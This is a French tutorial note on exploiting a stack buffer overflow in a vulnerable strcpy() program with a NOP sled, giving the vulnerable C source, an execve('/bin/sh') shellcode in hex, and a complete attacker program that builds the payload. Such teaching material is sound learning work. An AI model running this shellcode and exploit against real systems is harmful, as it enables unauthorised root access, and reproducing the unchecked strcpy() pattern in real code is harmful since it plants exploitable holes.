

#### **Théorie**

- La fonction strcpy() ne vérifie pas la taille de ce qu'elle copie ni la taille du buffer dans lequel elle le copie. On va donc pouvoir contourner ça pour modifier l'adresse de retour pour la faire pointer sur notre shellcode qui, lui, va nous donner les droits root. Par contre, on va utiliser un nop sled cette fois ci.
- Un nop c'est une instruction assembleur de base utilisée pour faire des pauses mais en gros elles ne font rien. Un nop sled c'est une partie d'un buffer ou autre qu'on va remplir avec des instructions nop.

#### **Pratique**

##### **Exploit 1**

- **Environnement**
	- L'os ne doit pas varier l'adresse de la stack. Donc l'ASLR (Address Space Layout Randomization) ne doit pas être activé.

- **Code source :**
```C
Code 
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[]){
	char little_array[512];
	if (argc > 1)
		strcpy(little_array, argv[1]);
}
```

- **Analyse du code source**
	- On voit que notre input (argv) est copié vers un buffer de taille max 512 bytes mais rien ne nous empêche de faire un buffer overflow.

- **Shellcode**
- `\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68`

- **Exploitation**
	- On va cette fois-ci utiliser un nop sled pour avoir une plus grande marge d'erreur car si l'adresse de retour retombe sur n'importe quelles instruction nop avant le shellcode, ça va justement l'envoyer dessus. On va premièrement remplir le buffer entièrement avec l'adresse du début du buffer. Ensuite, on va remplacer la première moitié du buffer avec le nop sled. Enfin, on va foutre notre shellcode en plein milieu du buffer (d'où le buff + ((bsize/2) - (strlen(shellcode)/2));) ca va prendre en compte la moitié du buffer et la moitié du shellcode. Et enfin on rajoute un \0 pour marquer la fin d'un buffer de char.
```C
Programme attaquant pour créer le shellcode
#include <stdlib.h>
#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define NOP 0x90
char shellcode[] =
"\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
"\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
"\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
unsigned long get_sp(void) {
	__asm__("movl %esp,%eax");
}
void main(int argc, char *argv[]){
	char *buff, *ptr;
	long *addr_ptr, addr;
	int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
	int i;
	if (argc > 1) bsize = atoi(argv[1]);
	if (argc > 2) offset = atoi(argv[2]);
	if (!(buff = malloc(bsize))) {
		printf("Can’t allocate memory.\n");
		exit(0);
	}
	addr = get_sp() - offset;
	printf("Using address: 0x%x\n", addr);
	ptr = buff;
	addr_ptr = (long *) ptr;
	for (i = 0; i < bsize; i+=4)
		*(addr_ptr++) = addr;
	for (i = 0; i < bsize/2; i++)
		buff[i] = NOP;
	ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
	for (i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];
	buff[bsize - 1] = "\0";
	memcpy(buff,"BUF=", 4);
	putenv(buff);
	system("/bin/bash");
}
```


- 
	- Maintenant c'est exactement pareil que pour le strcpy exploit sauf que là on a beaucoup plus de combinaisons gagnantes.
